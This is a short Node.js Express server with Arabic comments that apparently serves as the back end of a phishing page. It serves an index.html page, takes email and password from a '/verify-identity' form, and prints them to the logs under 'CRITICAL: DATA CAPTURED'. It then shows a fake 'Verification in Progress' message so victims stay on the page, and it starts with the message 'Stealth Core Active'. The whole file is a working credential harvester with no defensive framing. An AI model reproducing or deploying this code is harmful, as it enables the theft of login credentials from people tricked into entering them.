const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

// هذا السطر يضمن أن السيرفر يقرأ صفحة الـ HTML فور فتح الرابط
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال البيانات وطباعتها في الـ Logs
app.post('/verify-identity', (req, res) => {
    const { email, password } = req.body;
    
    console.log("====================================");
    console.log("CRITICAL: DATA CAPTURED");
    console.log("ID: " + email);
    console.log("KEY: " + password);
    console.log("====================================");
    
    // توجيه لصفحة توحي بنجاح العملية
    res.send('<div style="font-family:sans-serif; text-align:center; padding-top:100px;"><h1>Verification in Progress...</h1><p>Please do not close this window. Hardware sync takes up to 2 minutes.</p></div>');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Stealth Core Active'));
